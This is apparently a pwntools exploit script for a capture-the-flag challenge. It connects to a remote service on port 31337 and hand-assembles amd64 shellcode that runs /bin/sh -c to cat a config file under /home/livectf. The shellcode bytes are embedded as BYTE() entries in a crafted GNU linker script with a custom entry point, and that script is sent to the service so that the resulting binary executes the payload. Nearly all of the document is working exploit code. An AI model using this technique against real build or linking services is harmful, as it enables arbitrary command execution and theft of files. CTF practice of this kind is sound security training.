#!/usr/bin/python3
from pwn import *

def connect():
    HOST = os.environ.get('HOST', 'localhost')
    PORT = 31337

    io = remote(HOST, int(PORT))
    return io

def pad(s):
    l = len(s)
    bs = l//8 + 1
    return s.ljust(bs*8, b"\x00")

context.bits = 64
context.arch = "amd64"

def main():
    p = connect()
    file_name = b"/bin/sh".ljust(24, b"\x00")
    command = b"cat /home/livectf/.config.toml".ljust(32, b"\x00")
    shellcode = asm(f"""
    add rsp, 0x100
mov rdi, 0x68732f6e69622f
mov rdx, 0x632d
push rdi
mov rdi, rsp
push rdx
mov rdx, {u64(command[24:])}
push rdx
mov rdx, {u64(command[16:24])}
push rdx
mov rdx, {u64(command[8:16])}
push rdx
mov rdx, {u64(command[:8])}
push rdx
xor rdx, rdx
push rdx
mov rdx, rsp
add rdx, 0x8
push rdx
add rdx, 0x20
push rdx
add rdx, 0x8
push rdx
xor rdx, rdx
mov rsi, rsp
mov rax, 0x3b
syscall
            """)
    shellcode = pad(shellcode)
#    shellcode = pad(b"A"*200)
    print(shellcode.hex())

    ld_file = """OUTPUT_FORMAT("elf64-x86-64", "elf64-x86-64",
	      "elf64-x86-64")
OUTPUT_ARCH(i386:x86-64)
ENTRY(my_start)
SECTIONS
{
PROVIDE (__executable_start = SEGMENT_START("text-segment", 0x400000));
  . =  SIZEOF_HEADERS;
SHELL :
{
    """

    for i in shellcode:
        ld_file+=f"BYTE({i})\n"

    ld_file+= f'}}\nmy_start = . - {len(shellcode)};\n'
    
    ld_file+= """__init_array_start = .;
__init_array_end = .;
    } """



    print(ld_file)
    p.sendline(ld_file)
    p.sendline("")
    print(p.recvall().decode())
    


if __name__ == "__main__":
    main()


